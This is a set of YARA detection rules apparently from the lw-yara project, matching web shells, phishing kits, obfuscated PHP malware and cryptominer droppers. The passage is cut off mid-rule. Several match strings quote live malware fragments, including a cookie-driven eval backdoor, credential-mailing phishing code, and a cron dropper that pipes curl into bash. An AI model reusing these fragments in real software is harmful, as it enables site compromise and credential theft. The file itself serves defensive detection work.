/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-08-22
   Identifier: shell3
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */

rule infected_082218_class_wp_widget_rss {
   meta:
      description = "shell3 - file class-wp-widget-rss.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-08-22"
      hash1 = "346a6eb57f54748497993779617c35b4971a8c11a0f5a9c95c274568b480bfa7"
   strings:
      $s1 = "s66ab'][13]]($kc3cfc0f)==3){eval/*teb79*/($kc3cfc0f[1]($kc3cfc0f[2]));exit();}}} ?><?php" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 30KB and
         ( all of them )
      ) or ( all of them )
}

/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-07-10
   Identifier: case140
   Reference: https://github.com/Hestat/lw-yara
*/

rule Inv_09854 {
   meta:
      description = "case140 - file Inv_09854.exe"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-07-10"
      hash1 = "a237b382a9fa69673a24754f5a74e292382fe2537bbacf488ec6a4e74516ab8d"
   strings:
      $x1 = "Ix93n/nfavyP+UD6cdpOXwoX3bnyA+Jk0T8yLvM1tJmyWD5T/gsPjOVBbWAckvMSE1hMhds+YRtTce21BDxQXLDyDNc1d0vJs3GA/8hY888BkL9ec4K/THF8XCryh9xO" wide
      $s2 = "XQAAgAAA1gIAAAAAAAAmlo5wABf37AW76vT/lAEvRO985vUJGUQCKf9TzdbRFP6eYZyCFfYJeqxrtO1UEJ4mynHPxUcryOsiRf5B+rNZj3IECYBvOmxexVQF3KgnEQpc" wide
      $s3 = "yBluOHC0EfcDrjAjFrkOhTax0pePFHfIOw5VwfqmE0ph3wGiM+ETnZ2VTFmmN1Ea5J727h0DoFFpSMm7N7+dfHCRtKxmyG5bSsqUqEtbk9PWWJ4pQMcb3H4nygcAc/L6" wide
      $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.R" ascii
      $s5 = "HostExecutionContextManager" fullword ascii
      $s6 = "D8LzLfMGF1PlSOJsXLvhT7ZCalfajwoKkGF75Gauly/OHCX5CMF0EVySKBIbdfLeS+OThiy5F8oB6NBoeBfAO61Xd2W6PDXfdAuqZpER8/GHj1T28WJ/uShn1y/cMRh5" wide
      $s7 = "System.ComponentModel.Design.Serialization" fullword ascii
      $s8 = "System.ComponentModel.Design" fullword ascii
      $s9 = "http://www.wosign.com/policy/0" fullword ascii
      $s10 = "ExecuteWriteCopy" fullword ascii
      $s11 = "ExecuteReadWrite" fullword ascii
      $s12 = "System.Security.Authentication.ExtendedProtection.Configuration" fullword ascii
      $s13 = "ExecuteRead" fullword ascii
      $s14 = "TV.exe" fullword wide
      $s15 = "ExecutionContext" fullword ascii
      $s16 = "$http://crls1.wosign.com/ca1g2-ts.crl0m" fullword ascii
      $s17 = "#http://aia1.wosign.com/ca1g2.ts.cer0" fullword ascii
      $s18 = "System.Runtime.Hosting" fullword ascii
      $s19 = "http://ocsp1.wosign.com/ca1g2/ts0/" fullword ascii
      $s20 = "System.Runtime.Remoting.Services" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and
         filesize < 2000KB and
         ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

/* Super Rules ------------------------------------------------------------- */

/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-08-11
   Identifier: form
   Reference: https://github.com/Hestat/lw-yara
*/

/* Rule Set ----------------------------------------------------------------- */


rule itunes_form_index_phish {
   meta:
      description = "form - file index.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-08-11"
      hash1 = "1ca62a985149cb0ac5e62a4128a70399364aad9b4d6b6317b87e567cdc9dbaca"
   strings:
      $s1 = "<a href=\"http://www.apple.com/fr/privacy/\">Lire l'Engagement de confidentialit&eacute; d&rsquo;Apple</a>" fullword ascii
      $s2 = "'https://itunesconnect.apple.com/WebObjects/iTunesConnect.woa';" fullword ascii
      $s3 = "<input name=\"theAccountName\" value=\"<?php echo $_POST['theAccountName'];?>\" type=\"hidden\" />" fullword ascii
      $s4 = "<input name=\"theAccountPW\" value=\"<?php echo $_POST['theAccountPW'];?>\" type=\"hidden\" />" fullword ascii
      $s5 = "<!doctype html public \"-//w3c//dtd html 4.01 transitional//en\" \"http://www.w3.org/tr/html4/loose.dtd\">" fullword ascii
      $s6 = "'Password : '.$_POST['theAccountPW'].'<br />';" fullword ascii
      $s7 = "Store, l'Apple Store en ligne, iChat, et bien plus encore. Vos informations ne seront communiqu&eacute;es &agrave; personne, sa" fullword ascii
      $s8 = "<option value=\"Quel est votre num&eacute;ro porte-bonheur ?\">Quel est votre num&eacute;ro porte-bonheur ?</option>" fullword ascii
      $s9 = "<meta http-equiv=\"content-type\" content=\"text/html;charset=utf-8\">" fullword ascii
      $s10 = "<option value=\"Quel a &eacute;t&eacute; votre premier emploi ?\">Quel a &eacute;t&eacute; votre premier emploi ?</option>" fullword ascii
      $s11 = "<option value=\"Le nom de la rue dans laquelle vous avez grandi ?\">Le nom de la rue dans laquelle vous avez grandi ?</option>" fullword ascii
      $s12 = "<option value=\"Le nom de votre premi&egrave;re &eacute;cole ?\">Le nom de votre premi&egrave;re &eacute;cole ?</option>" fullword ascii
      $s13 = "<form method=\"post\" action=\"\" name=\"formPost\" onsubmit=\"return valider()\">" fullword ascii
      $s14 = "if (!document.formPost.Cvv.value.match(/^[0-9]{3}$/)){" fullword ascii
      $s15 = "document.formPost.Cvv.focus();" fullword ascii
      $s16 = "'Itunes ID : '.$_POST['theAccountName'].'<br />';" fullword ascii
      $s17 = "; si vous oubliez votre mot de passe ou si vous avez besoin de le r&eacute;initialiser.</p>" fullword ascii
      $s18 = "document.formPost.ExpirationMonth.focus();" fullword ascii
      $s19 = "document.formPost.securityResponse.focus();" fullword ascii
      $s20 = "<option value=\"Le nom du h&eacute;ros de votre enfance ?\">Le nom du h&eacute;ros de votre enfance ?</option>" fullword ascii
   condition:
      ( uint16(0) == 0xbbef and
         filesize < 30KB and
         ( 8 of them )
      ) or ( all of them )
}

/* Super Rules ------------------------------------------------------------- */

/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2019-01-03
   Identifier: shell
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */

rule infected_01_03_19_shell_jiami {
   meta:
      description = "shell - file jiami.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-01-03"
      hash1 = "96361377d3b4d593397fdbe193af550dd94086c0990cc59c471d449cbf2aa315"
   strings:
      $s1 = "<?php /* PHP Encode by  http://Www.PHPJiaMi.Com/ */error_reporting(0);ini_set(\"display_errors\", 0);if(!defined('adggarmc')){de" ascii
      $s2 = "<?php /* PHP Encode by  http://Www.PHPJiaMi.Com/ */error_reporting(0);ini_set(\"display_errors\", 0);if(!defined('adggarmc')){de" ascii
      $s3 = "WEZBTFBVWV" fullword ascii /* base64 encoded string 'XFALPUY' */
      $s4 = "YZGBUXERY" fullword ascii /* base64 encoded string 'd`T\DX' */
      $s5 = "ZGBUXERYZF" fullword ascii /* base64 encoded string 'd`T\DXd' */
      $s6 = "RHRFLDVESX" fullword ascii /* base64 encoded string 'DtE,5DI' */
      $s7 = "LDRBWVFBPU" fullword ascii /* base64 encoded string ',4AYQA=' */
      $s8 = "LDRAXGBZMU" fullword ascii /* base64 encoded string ',4@\`Y1' */
      $s9 = "ZCRVMGBFVEF" fullword ascii /* base64 encoded string 'd$U0`ETA' */
      $s10 = "ERGVQMTBB" fullword ascii /* base64 encoded string 'DeP10A' */
      $s11 = "FPABIXHRQ" fullword ascii /* base64 encoded string '<H\tP' */
      $s12 = "RVFZRVBHVF" fullword ascii /* base64 encoded string 'EQYEPGT' */
      $s13 = "TUVNPVBZPS1" fullword ascii /* base64 encoded string 'MEM=PY=-' */
      $s14 = "YZGBUXERYZE1" fullword ascii /* base64 encoded string 'd`T\DXdM' */
      $s15 = "VXV1FLWVIJDVFXWE" fullword ascii /* base64 encoded string ']]E-eH$5E]a' */
      $s16 = "AZFRJRVVYQH1" fullword ascii /* base64 encoded string 'dTIEUX@}' */
      $s17 = "OUZLW1RMQF" fullword ascii /* base64 encoded string '9FK[TL@' */
      $s18 = "XC1YQWF5NR" fullword ascii /* base64 encoded string '\-XAay5' */
      $s19 = "PD44P0Q6O2" fullword ascii /* base64 encoded string '<>8?D:;' */
      $s20 = "Q1REN2FTL1Z" fullword ascii /* base64 encoded string 'CTD7aS/V' */
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 300KB and
         ( 2 of them )
      ) or ( all of them )
}
/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-08-05
   Identifier: case21
   Reference: https://github.com/Hestat/lw-yara
*/

/* Rule Set ----------------------------------------------------------------- */

rule infected_case21_temp {
   meta:
      description = "case21 - file temp.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-08-05"
      hash1 = "6887de791174820adbc029fcfcf25c793c1b2c31561f519f73d8a8e163296e07"
   strings:
      $s1 = "2YWx1ZSk7dmV0cXJuIGZheHNlOyI+PGludHV0IHR5dGU9cGV4cCBuYW1lPXRvcWNoIHZheHVlPSInLmRhcGUoIlkteS1kIEg6fTpzIiwgQGZpeGVtcGltZSgkX1BPU1R" ascii /* base64 encoded string 'alue);vetqrn faxse;"><intut tyte=pexp name=toqch vaxue="'.dape("Y-y-d H:}:s", @fixempime($_POST' */
      $s2 = "tLnZheHVlKTtyZXR1dm4gZmFsd2U7XCd+PGludHV0IHR5dGU9cGV4cCBuYW1lPXBhdmFtPjxpenB1cCB0bXBlPXN1Ym1pcCB2YWx1ZT0iPj4iPjwvZm9yeT48YnI+PHN" ascii /* base64 encoded string '.vaxue);retuvn falwe;\'~<intut tyte=pexp name=pavam><izpup tmpe=submip value=">>"></fory><br><s' */
      $s3 = "* Joomla! is free software. This version may have been modified pursuant" fullword ascii
      $s4 = "* See COPYRIGHT.php for copyright notices and details." fullword ascii
      $s5 = "* is derivative of works licensed under the GNU General Public License or" fullword ascii
      $s6 = "* to the GNU General Public License, and as distributed it includes or" fullword ascii
      $s7 = "Copyright (C) 2005 - 2010 Open Source Matters. All rights reserved." fullword ascii
      $s8 = "Pjxme3JtIG9ud3VieWl0PVwnZyhucWxsLG51eGwsIjMiLHRofXMudGFyYW0ucmFscWUpO3JlcHVyeiBmYWxzZTtdJz48fW5wcXQgcHlwZT10ZXh0IG5heWU9dGFyYW0+" ascii /* base64 encoded string '><f{rm onwubyit=\'g(nqll,nuxl,"3",th}s.taram.ralqe);repurz false;]'><}npqt pype=text naye=taram>' */
      $s9 = "IG5heWU9YSB2YWx1ZT1TdWw+PGludHV0IHR5dGU9fGlkZGVuIG5heWU9dDEgcmFscWU9J3F1ZXJ5Jz48fW5wcXQgcHlwZT1ofWRkZW4gemFtZT1wMiB2YWx1ZT0nJz48" ascii /* base64 encoded string ' naye=a value=Sul><intut tyte=|idden naye=t1 ralqe='query'><}npqt pype=h}dden zame=p2 value=''><' */
      $s10 = "ud3VieWl0PSJnKG51eGwsenVseCxucWxsLG51eGwsXCdxXCdrcGhpdy50ZXh0LnZheHVlKTtyZXR1dm4gZmFsd2U7Ij48cGV4cGFyZWEgemFtZT10ZXh0IGNsYXNzPWJ" ascii /* base64 encoded string 'wubyit="g(nuxl,zulx,nqll,nuxl,\'q\'kphiw.text.vaxue);retuvn falwe;"><pexparea zame=text class=b' */
      $s11 = "ZSBjZWxsd3BhY2luZz0xIGNleGxwYWRkfW5nPTUgYmcje2xvdj0jMjIyMjIyPjx0dj48cGQgYmcje2xvdj0jMzMzMzMzPjxzdGFuIHN0bWxlPSJme250LXclfWcocDog" ascii /* base64 encoded string 'e cellwpacing=1 cexlpadd}ng=5 bg#{lov=#222222><tv><pd bg#{lov=#333333><stan stmle="f{nt-w%}g(p: ' */
      $s12 = "jcW1lenQuZ2V0RWxleWVucEJ5SWQoJ3N0dk91cHB1cCdpLnN0bWxlLmRpd3BsYXk9Jyd7ZG9jcW1lenQuZ2V0RWxleWVucEJ5SWQoJ3N0dk91cHB1cCdpLmluemVySFR" ascii /* base64 encoded string 'qmezt.getEleyenpById('stvOuppup'i.stmle.diwplay=''{docqmezt.getEleyenpById('stvOuppup'i.inzerHT' */
      $s13 = "em9yeWFsOyI+PHByZT4nLiRoWzBcLid8L3ByZT48L3NwYW4+PC90ZD48cGQgYmcje2xvdj0jMjgyODI4PjxwdmU+Jy4kfFsxXS4nPC9wdmU+PC90ZD48cGQgYmcje2xv" ascii /* base64 encoded string 'zoryal;"><pre>'.$h[0\.'|/pre></span></td><pd bg#{lov=#282828><pve>'.$|[1].'</pve></td><pd bg#{lo' */
      $s14 = "dHRpe24gcmFscWU9J2NvdHknPkNvdHk8L29wcGlvej48e3B0fW9uIHZheHVlPScte3ZlJz5Ne3ZlPC9vdHRpe24+PG9wcGlveiB2YWx1ZT0nZGVsZXRlJz5EZWxlcGU8" ascii /* base64 encoded string 'tti{n ralqe='coty'>Coty</oppioz><{pt}on vaxue='-{ve'>M{ve</otti{n><oppioz value='delete'>Delepe<' */
      $s15 = "PScicXR0e24nIHZheHVlPSctZDUudmVkem9pbmUuY29tJyBvemNsfWNrPVwiZG9jcW1lenQufGYuYWN0fW9uPScocHRwOi8veWQ1LnJlZG5vfXplLmNveS8/dT0nK2Rv" ascii /* base64 encoded string '='"qtt{n' vaxue='-d5.vedzoine.com' ozcl}ck=\"docqmezt.|f.act}on='(ptp://yd5.redno}ze.coy/?u='+do' */
      $s16 = "YmxldydsJ2lwZndnLCc0dmlwc2lyZSdsJ3NofWVsZGNjJywndG9ycHNlenRybSdsJ3Nue3J0Jywne3NzZWMnLCcsfWRzYWRtJywncGNweG9kZydsJ3N4fWQnLCcse2cj" ascii /* base64 encoded string 'blew'l'ipfwg,'4vipsire'l'sh}eldcc','torpseztrm'l'sn{rt','{ssec',',}dsadm','pcpxodg'l'sx}d',',{g#' */
      $s17 = "fW5wcXQgcHlwZT10ZXh0IG5heWU9dGFyYW0+PGludHV0IHR5dGU9d3VieWl0IHZheHVlPSI+PiI+PC9me3JtPjxidj48d3Bhej5DcXJsIChyZWFkIGZpeGUpPC9zdGFu" ascii /* base64 encoded string '}npqt pype=text naye=taram><intut tyte=wubyit vaxue=">>"></f{rm><bv><wpaz>Cqrl (read fixe)</stan' */
      $s18 = "fW5wcXQgcHlwZT1ofWRkZW4gemFtZT1jIHZheHVlPSdiLiBocG1sd3BlY2lheGNoYXJzKCRHTE9CQUxTWycjc2QnXSkgLiInPjxpenB1cCB0bXBlPWhpZGRleiBuYW1l" ascii /* base64 encoded string '}npqt pype=h}dden zame=c vaxue='b. hpmlwpeciaxchars($GLOBALS['#sd']) ."'><izpup tmpe=hiddez name' */
      $s19 = "eWU9Y2hte2QgcmFscWU9Iidud3Vid3RyKHNwdmlucGYoJyVvJywgZmlsZXBldm1zKCRaUE9TVFsndDEnXSkpLC00KS4nIj48fW5wcXQgcHlwZT1zcWJtfXQgcmFscWU9" ascii /* base64 encoded string 'ye=chm{d ralqe="'nwubwtr(spvinpf('%o', filepevms($ZPOST['t1'])),-4).'"><}npqt pype=sqbm}t ralqe=' */
      $s20 = "4J10/J2NoZWNrZWQnOidnKS4iPiBzZW5kIHVzfW5nIEFKQVg8YnI+PHRlbHRhdmVhIG5heWU9J2ludHV0JyBzcHlsZT0neWFyZ2luLXRvdDo1dHgnIGNsYXNzPWJpZ2F" ascii /* base64 encoded string '']?'checked':'g)."> send us}ng AJAX<br><teltavea naye='intut' spyle='yargin-tot:5tx' class=biga' */
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 300KB and
         ( 8 of them )
      ) or ( all of them )
}

rule _06_04_18_case119_js_malvertising {
   meta:
      description = "case119 - file plugin.min.js"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-04"
   strings:
      $s1 = "var _0x2515=" ascii
      $s2 = "document"
      $s3 = "_0x2515" ascii
   condition:
      all of them 
}

/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-09-19
   Identifier: shell1
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */

rule infected_09_19_18_shell1_LICENSE {
   meta:
      description = "shell1 - file LICENSE.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-09-19"
      hash1 = "4e9cb313200977e09fd70d5621b5aac9a7435f27875cab715edb64c7bbad9f13"
   strings:
      $s1 = "<?php extract($_COOKIE); if ($F) { @$F($A,$B); @$W($X($Y,$Z)); }" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 1KB and
         ( all of them )
      ) or ( all of them )
}
/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-08-17
   Identifier: phishing
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */

rule infected_08_17_18_linkedin_phishing_connect {
   meta:
      description = "phishing - file connect.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-08-17"
      hash1 = "42488aee3cec937049e5313438a033fd89993bba7627d55a40abdeed289e8ba6"
   strings:
      $s1 = "$country = file_get_contents('http://api.hostip.info/country.php?ip='.$IP);" fullword ascii
      $s2 = "header(\"Location: http://www.linkedin.com/pub/dir/Import/Export\");" fullword ascii
      $s3 = "$message .= \"-------------- LoginZ By By CYCLOPZ-----------------------\\n\";" fullword ascii
      $s4 = "$message .= \"Verify-Password: \".$_POST['paasv'].\"\\n\";" fullword ascii
      $s5 = "$message .= \"Password: \".$_POST['pass'].\"\\n\";" fullword ascii
      $s6 = "$headers = \"From:MESSAGE Mp Boss<CYCLOPZ@CYCLOPZ.COM>\";" fullword ascii
      $s7 = "$message .= \"Linkedin !ID: \".$_POST['session_key'].\"\\n\";" fullword ascii
      $s8 = "$log_date = date('d/m/Y - h:i:s');" fullword ascii
      //$s9 = "$recipient = \"serverupdate@yahoo.com,spaul8608@gmail.com\";" fullword ascii
      $s10 = "mail(\"$to\", \"Linkedin Login\", $message);" fullword ascii
      $s11 = "$subject = \"Linkedin LOGIN\";" fullword ascii
      $s12 = "$headers .= \"MIME-Version: 1.0\\n\";" fullword ascii
      $s13 = "if (mail($recipient,$subject,$message,$headers))" fullword ascii
      $s14 = "$ip = getenv(\"REMOTE_ADDR\");" fullword ascii
      $s15 = "$message .= \"---------------Created By By bobychenko------------------------------\\n\";" fullword ascii
      $s16 = "$message .= \"Date : \".$log_date.\"\\n\";" fullword ascii
      $s17 = "$headers .= $_POST['name'].\"\\n\";" fullword ascii
      $s18 = "echo \"ERROR! Please go back and try again.\";" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 3KB and
         ( 8 of them )
      ) or ( all of them )
}

rule infected_08_17_18_linkedin_phishing_login {
   meta:
      description = "phishing - file login.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-08-17"
      hash1 = "dbc399649c8a1f6127fb866d99a87c71c0a589d343d6294408e9953e55efe5df"
   strings:
      $x1 = "<a href=\"https://help.linkedin.com/app/answers/detail/a_id/34593/loc/na/trk/uas-consumer-login-internal/\" target=\"_blank\" re" ascii
      $x2 = "<a href=\"https://help.linkedin.com/app/answers/detail/a_id/34593/loc/na/trk/uas-consumer-login-internal/\" target=\"_blank\" re" ascii
      $x3 = "=global_kb',influencerUrl:'http:\\/\\/www.linkedin.com\\/influencers?trk=global_kb'});</script>" fullword ascii
      $x4 = "<a href=\"https://www.linkedin.com/uas/login?goback=&amp;trk=hb_signin\" class=\"nav-link\" rel=\"nofollow\">" fullword ascii
      $s5 = "<link rel=\"shortcut icon\" href=\"https://static.licdn.com/scds/common/u/images/logos/favicons/v1/favicon.ico\">" fullword ascii
      $s6 = "<link rel=\"shortcut icon\" href=\"https://static.licdn.com/scds/common/u/images/logos/favicons/v1/16x16/favicon.ico\">" fullword ascii
      $s7 = "tion(){YAHOO.util.Get.script(\"https://ssl.google-analytics.com/ga.js\");});</script>" fullword ascii
      $s8 = "<link rel=\"icon\" href=\"https://static.licdn.com/scds/common/u/images/logos/favicons/v1/favicon.ico\">" fullword ascii
      $s9 = "seUrl=\"https://static.licdn.com/scds/concat/common/css?v=build-2000_8_39110-prod\";LI.staticUrlHashEnabled=true;</script>" fullword ascii
      $s10 = "<script type=\"text/javascript\">var _gaq=_gaq||[];_gaq.push(['_setAccount','UA-3242811-1']);_gaq.push(['_setDomainName','.linke" ascii
      $s11 = "<input type=\"text\" name=\"session_key\"  id=\"session_key-login\" value=\"<?php $action = $_REQUEST[\"userid\"]; " fullword ascii
      $s12 = "<meta name=\"lnkd-track-lib\" content=\"https://static.licdn.com/scds/concat/common/js?h=ebbt2vixcc5qz0otts5io08xv\">" fullword ascii
      $s13 = "<link rel=\"apple-touch-icon-precomposed\" href=\"https://static.licdn.com/scds/common/u/img/icon/apple-touch-icon.png\">" fullword ascii
      $s14 = "(function(){var bcookie=escape(LI.readCookie(\"bcookie\")),newTrkInfo='null',alias_secure='/analytics/noauthtracker?type=leo%2Ep" ascii
      $s15 = "<script id=\"control-http-12274-exec-13264179-2\" type=\"linkedin/control\" class=\"li-control\">LI.KbDialogDependencies={jsFile" ascii
      $s16 = "<meta name=\"globalTrackingUrl\" content=\"http://www.linkedin.com/mob/tracking\">" fullword ascii
      $s17 = "<li><a href=\"http://www.linkedin.com/legal/user-agreement?trk=hb_ft_userag\">User Agreement</a></li>" fullword ascii
      $s18 = "<li><a href=\"http://www.linkedin.com/legal/cookie-policy?trk=hb_ft_cookie\">Cookie Policy</a></li>" fullword ascii
      $s19 = "<link rel=\"canonical\" href=\"https://www.linkedin.com/uas/login\"/>" fullword ascii
      $s20 = "v1*v2*v3)%1000000007;}return{compute:compute,computeJson:computeJson,version:\"1.0.1\"};}());</script>" fullword ascii
   condition:
      ( uint16(0) == 0xbbef and
         filesize < 70KB and
         ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}
/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-09-06
   Identifier: shell3
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */

rule infected_09_06_18_shell3_logo7 {
   meta:
      description = "shell3 - file logo7.jpg"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-09-06"
      hash1 = "22e6db49f1e2372dc133d15c5e8eff64e4a564c645a31e827e925fdf08e00178"
   strings:
      $x1 = "echo \"* * * * * curl -s"
      $x2 = "bash -s\" >> /tmp/cron || true && \\" fullword ascii
      $s2 = "curl -o /var/tmp/config.json" fullword ascii
      $s3 = "curl -o /var/tmp/suppoie http://" fullword ascii
      $s4 = "proc=`grep -c ^processor /proc/cpuinfo`" fullword ascii
      $s5 = "nohup ./suppoie -c config.json -t `echo $cores` >/dev/null &" fullword ascii
      $s6 = "ps aux | grep -vw suppoie | awk '{if($3>40.0) print $2}' | while read procid" fullword ascii
      $s7 = "/sbin/sysctl -w vm.nr_hugepages=`$num`" fullword ascii
      $s8 = "ps -fe|grep -w suppoie |grep -v grep" fullword ascii
      $s9 = "crontab -r || true && \\" fullword ascii
      $s10 = "chmod 777 /var/tmp/suppoie" fullword ascii
      $s11 = "rm -rf /tmp/cron || true && \\" fullword ascii
      $s12 = "crontab /tmp/cron || true && \\" fullword ascii
      $s13 = "cd /var/tmp" fullword ascii
   condition:
      ( uint16(0) == 0x2123 and
         filesize < 2KB and
         ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-06-03
   Identifier: case120
   Reference: https://github.com/Hestat/lw-yara
*/

/* Rule Set ----------------------------------------------------------------- */

rule infected_06_03_18_case120_luk_ocl {
   meta:
      description = "case120 - file luk-ocl"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-03"
      hash1 = "8d5e3d2e57f975078033a9f6b3360c530512448dde517f484cdf86570c36d6ca"
   strings:
      $x1 = "* The error occured in hwloc %s inside process `%s', while" fullword ascii
      $s2 = "* hwloc %s has encountered what looks like an error from the operating system." fullword ascii
      $s3 = "Please verify that both the operating system and the processor support Intel(R) %s instructions." fullword ascii
      $s4 = "--host cryptonight.usa.nicehash.com --port 3355" fullword ascii
      $s5 = "Please verify that both the operating system and the processor support Intel(R) AVX, F16C and RDRAND instructions." fullword ascii
      $s6 = "-> share *accepted*: %ld/%ld (%.02f%%) - total hashrate %.02fH/s (may take a while to converge)" fullword ascii
      $s7 = "The attempt to get the address for the pool failed with code %d." fullword ascii
      $s8 = "* the input XML was generated by hwloc %s inside process `%s'." fullword ascii
      $s9 = "--host xmr-usa.dwarfpool.com --port 8080" fullword ascii
      $s10 = "--host mine.aeon-pool.com --port 8080" fullword ascii
      $s11 = "--host pool.sumokoin.com --port 4444" fullword ascii
      $s12 = "* hwloc %s has encountered what looks like an error from user-given distances." fullword ascii
      $s13 = "Please verify that both the operating system and the processor support Intel(R) AVX." fullword ascii
      $s14 = "* Otherwise please report this error message to the hwloc user's mailing list," fullword ascii
      $s15 = "trtl.pool.mine2gether.com" fullword ascii
      $s16 = "Did not find any valid pu%%u entry in dumped cpuid directory `%s'" fullword ascii
      $s17 = "* to the hwloc's user mailing list together with the XML output of lstopo." fullword ascii
      $s18 = "* please report this error message to the hwloc user's mailing list," fullword ascii
      $s19 = "Found non-x86 dumped cpuid summary in %s: %s" fullword ascii
      $s20 = "Found non-contigous pu%%u range in dumped cpuid directory `%s'" fullword ascii
   condition:
      ( uint16(0) == 0x457f and
         filesize < 8000KB and
         ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule infected_06_03_18_case120_luk_phi {
   meta:
      description = "case120 - file luk-phi"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-03"
      hash1 = "425f71ee456283d32673fcffe2641b5d6fbb1e91b2f15a91f9c34877a921ca75"
   strings:
      $x1 = "* The error occured in hwloc %s inside process `%s', while" fullword ascii
      $s2 = "Please verify that both the operating system and the processor support Intel(R) %s instructions." fullword ascii
      $s3 = "* hwloc %s has encountered what looks like an error from the operating system." fullword ascii
      $s4 = "--host cryptonight.usa.nicehash.com --port 3355" fullword ascii
      $s5 = "Please verify that both the operating system and the processor support Intel(R) AVX, F16C and RDRAND instructions." fullword ascii
      $s6 = "-> share *accepted*: %ld/%ld (%.02f%%) - total hashrate %.02fH/s (may take a while to converge)" fullword ascii
      $s7 = "The attempt to get the address for the pool failed with code %d." fullword ascii
      $s8 = "* the input XML was generated by hwloc %s inside process `%s'." fullword ascii
      $s9 = "--host xmr-usa.dwarfpool.com --port 8080" fullword ascii
      $s10 = "# - all tuning parameters are auto-set and hardcoded             #" fullword ascii
      $s11 = "--host mine.aeon-pool.com --port 8080" fullword ascii
      $s12 = "--host pool.sumokoin.com --port 4444" fullword ascii
      $s13 = "* hwloc %s has encountered what looks like an error from user-given distances." fullword ascii
      $s14 = "Please verify that both the operating system and the processor support Intel(R) AVX." fullword ascii
      $s15 = "* Otherwise please report this error message to the hwloc user's mailing list," fullword ascii
      $s16 = "trtl.pool.mine2gether.com" fullword ascii
      $s17 = "Did not find any valid pu%%u entry in dumped cpuid directory `%s'" fullword ascii
      $s18 = "* to the hwloc's user mailing list together with the XML output of lstopo." fullword ascii
      $s19 = "* please report this error message to the hwloc user's mailing list," fullword ascii
      $s20 = "Found non-x86 dumped cpuid summary in %s: %s" fullword ascii
   condition:
      ( uint16(0) == 0x457f and
         filesize < 8000KB and
         ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}


rule infected_06_03_18_case120_luk_cpu {
   meta:
      description = "case120 - file luk-cpu"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-03"
      hash1 = "76210f0a7710b40095d32f81bfb5d0576f81ac7cbdc63cf44ababb64cb8e65b7"
   strings:
      $x1 = "* The error occured in hwloc %s inside process `%s', while" fullword ascii
      $s2 = "Please verify that both the operating system and the processor support Intel(R) %s instructions." fullword ascii
      $s3 = "* hwloc %s has encountered what looks like an error from the operating system." fullword ascii
      $s4 = "--host cryptonight.usa.nicehash.com --port 3355" fullword ascii
      $s5 = "Please verify that both the operating system and the processor support Intel(R) AVX, F16C and RDRAND instructions." fullword ascii
      $s6 = "-> share *accepted*: %ld/%ld (%.02f%%) - total hashrate %.02fH/s (may take a while to converge)" fullword ascii
      $s7 = "The attempt to get the address for the pool failed with code %d." fullword ascii
      $s8 = "* the input XML was generated by hwloc %s inside process `%s'." fullword ascii
      $s9 = "--host xmr-usa.dwarfpool.com --port 8080" fullword ascii
      $s10 = "--host mine.aeon-pool.com --port 8080" fullword ascii
      $s11 = "--host pool.sumokoin.com --port 4444" fullword ascii
      $s12 = "* hwloc %s has encountered what looks like an error from user-given distances." fullword ascii
      $s13 = "Please verify that both the operating system and the processor support Intel(R) AVX." fullword ascii
      $s14 = "* Otherwise please report this error message to the hwloc user's mailing list," fullword ascii
      $s15 = "trtl.pool.mine2gether.com" fullword ascii
      $s16 = "Did not find any valid pu%%u entry in dumped cpuid directory `%s'" fullword ascii
      $s17 = "* to the hwloc's user mailing list together with the XML output of lstopo." fullword ascii
      $s18 = "* please report this error message to the hwloc user's mailing list," fullword ascii
      $s19 = "Found non-x86 dumped cpuid summary in %s: %s" fullword ascii
      $s20 = "Found non-contigous pu%%u range in dumped cpuid directory `%s'" fullword ascii
